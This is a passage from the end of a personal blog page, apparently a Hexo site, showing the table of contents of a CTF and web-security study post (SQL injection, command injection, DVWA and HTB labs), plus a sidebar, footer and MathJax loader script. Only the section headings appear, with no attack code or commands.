href="#web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">1.6.2.</span> <span class="toc-text">Web应用漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#owasp-zap"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">owasp-zap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nikto"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">nikto</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf"><span class="toc-number">2.</span> <span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.0.1.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#curl"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">curl</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80"><span class="toc-number">2.1.</span> <span class="toc-text">SQL 语法基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">显示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">字符串</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlite"><span class="toc-number">2.1.1.</span> <span class="toc-text">Sqlite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#url%E7%9A%84%E7%A0%81"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">url的码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">2.1.3.</span> <span class="toc-text">注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E6%9C%89%E6%95%88"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">判断注入点有效</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.1.4.</span> <span class="toc-text">联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9C%89%E5%87%A0%E5%88%97"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">判断有几列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E7%9A%84%E5%AD%97%E6%AE%B5%E9%A1%BA%E5%BA%8F"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">判断显示的字段顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97"><span class="toc-number">2.1.4.3.</span> <span class="toc-text">获取当前数据库名字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D"><span class="toc-number">2.1.4.4.</span> <span class="toc-text">获取当前数据库表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.1.4.5.</span> <span class="toc-text">获取字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.4.6.</span> <span class="toc-text">查询数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Cgroupconcat%E4%B8%8D%E8%83%BD%E7%94%A8"><span class="toc-number">2.1.4.7.</span> <span class="toc-text">如果groupconcat不能用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#command-injection"><span class="toc-number">2.1.5.</span> <span class="toc-text">Command Injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">2.2.</span> <span class="toc-text">文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-%E5%8F%98%E9%87%8F"><span class="toc-number">2.2.1.</span> <span class="toc-text">MYSQL 变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#secure-file-priv"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">secure file priv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">写入文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.3.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.4.</span> <span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%BB%BA%E7%AB%8B"><span class="toc-number">2.3.</span> <span class="toc-text">靶场建立</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#htb"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">HTB</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pikachu"><span class="toc-number">2.3.1.</span> <span class="toc-text">Pikachu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dvwa"><span class="toc-number">2.3.2.</span> <span class="toc-text">DVWA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie"><span class="toc-number">2.4.</span> <span class="toc-text">Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python-%E8%8E%B7%E5%8F%96%E4%BF%AE%E6%94%B9cookie"><span class="toc-number">2.4.0.1.</span> <span class="toc-text">python 获取，修改cookie</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/17/C-%E9%AB%98%E6%80%A7%E8%83%BD%E7%BC%96%E7%A8%8B/" title="C++高性能编程">C++高性能编程</a><time datetime="2025-07-17T19:47:19.000Z" title="Created 2025-07-17 19:47:19">2025-07-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/16/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/" title="操作系统概念">操作系统概念</a><time datetime="2025-07-16T20:55:14.000Z" title="Created 2025-07-16 20:55:14">2025-07-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/15/Kubuntu%E9%85%8D%E7%BD%AE/" title="Kubuntu配置">Kubuntu配置</a><time datetime="2025-07-15T05:25:37.000Z" title="Created 2025-07-15 05:25:37">2025-07-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/12/%E6%88%91%E4%BB%AC%E5%9C%A8AI%E6%97%B6%E4%BB%A3%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AD%A6%E4%B9%A0/" title="我们在AI时代该如何学习">我们在AI时代该如何学习</a><time datetime="2025-07-12T23:12:19.000Z" title="Created 2025-07-12 23:12:19">2025-07-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CA-Top-Down-Approach/" title="计算机网络A Top Down Approach">计算机网络A Top Down Approach</a><time datetime="2025-07-12T22:02:58.000Z" title="Created 2025-07-12 22:02:58">2025-07-12</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Fyind</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'all',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>